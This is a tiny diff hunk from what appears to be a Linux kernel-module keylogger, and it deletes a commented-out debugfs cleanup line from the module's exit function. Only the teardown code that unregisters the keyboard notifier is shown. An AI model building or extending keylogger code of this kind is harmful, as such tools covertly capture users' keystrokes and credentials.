@@ -142,6 +142,5 @@ static int run_keylogger(void)
 static int exit_keylogger(void)
 {
 	unregister_keyboard_notifier(&keysniffer_blk);
-	//debugfs_remove_recursive(subdir);
   return 0;
 }
